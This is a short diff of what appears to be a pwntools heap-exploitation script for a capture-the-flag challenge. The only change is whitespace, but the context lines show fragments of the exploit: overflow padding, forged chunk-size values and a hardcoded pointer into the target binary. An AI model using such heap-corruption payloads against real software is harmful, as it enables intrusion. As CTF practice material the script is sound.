@@ -94,6 +94,7 @@ def pwnit():
     buf1 = 'a'*(0x100 - 0x10) + p64(0x100) + p64(0x161)*5
     Change(2,data2,buf1)
     success('coike2:'+data2)
+    
     rank_ptr = 0x0000000000203100
     ptr = rank_ptr + 0x30
     # Delete(1,data1):
@@ -133,4 +134,3 @@ def pwnit():
     
 if __name__ == "__main__":
     pwnit()
-
